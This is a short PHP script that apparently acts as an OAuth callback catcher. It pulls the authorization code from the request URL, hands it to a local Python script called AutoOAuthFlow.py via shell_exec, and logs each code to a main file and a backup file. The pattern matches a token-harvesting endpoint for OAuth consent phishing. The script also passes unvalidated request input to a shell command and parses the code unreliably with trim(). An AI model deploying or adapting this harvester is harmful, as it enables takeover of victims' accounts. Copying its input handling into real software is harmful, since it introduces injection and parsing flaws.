<?php
$requestUrl = $_SERVER['REQUEST_URI'];
$file = '/var/www/html/codes/codes.txt';
$bakfile = '/var/www/html/codes/codes-bak.txt';
$fp = fopen($file, 'a');
$fp2 = fopen($bakfile, 'a');
$trim = trim($requestUrl, "/?code=");
$oauthCode = strtok($trim, "&");
$command = escapeshellcmd('python3 /var/www/html/AutoOAuthFlow.py ' . $oauthCode);
shell_exec($command);
fwrite($fp, "OAuth Code:\n");
fwrite($fp, $oauthCode . "\n\n\n");
fclose($fp);
fwrite($fp2, "OAuth Code:\n");
fwrite($fp2, $oauthCode . "\n\n\n");
fclose($fp2);
?>
